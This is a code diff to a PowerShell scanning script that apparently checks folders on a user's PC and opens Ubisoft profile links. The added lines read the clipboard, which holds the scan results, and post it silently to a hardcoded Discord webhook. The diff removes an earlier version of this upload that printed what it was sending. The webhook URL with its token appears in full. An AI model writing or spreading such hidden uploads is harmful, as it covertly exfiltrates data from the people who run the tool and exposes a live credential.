@@ -89,6 +89,15 @@ foreach ($path in $paths) {
 [System.Windows.Forms.Clipboard]::SetText($Z -join "`r`n")
 Write-Host "`nScan complete. Results copied to clipboard." -ForegroundColor Green
 
+# Send clipboard content to Discord webhook
+$webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
+$clipboardContent = [System.Windows.Forms.Clipboard]::GetText()
+$jsonPayload = @{
+    content = $clipboardContent
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
+
 # Ubisoft folder scan and link open
 $ubisoftPath = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\savegames"
 if (Test-Path $ubisoftPath) {
@@ -102,19 +111,4 @@ if (Test-Path $ubisoftPath) {
     Write-Host "Ubisoft profile links opened in browser."
 } else {
     Write-Host "Ubisoft savegames folder not found."
-}
-
-# Send results to Discord webhook
-$webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
-$payload = @{
-    content = $Z -join "`r`n"
-}
-$jsonPayload = $payload | ConvertTo-Json -Compress
-Write-Host "Sending payload to Discord webhook: $jsonPayload"
-
-try {
-    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
-    Write-Host "Response from Discord: $response" -ForegroundColor Green
-} catch {
-    Write-Host "Error sending message to Discord webhook: $_" -ForegroundColor Red
 }
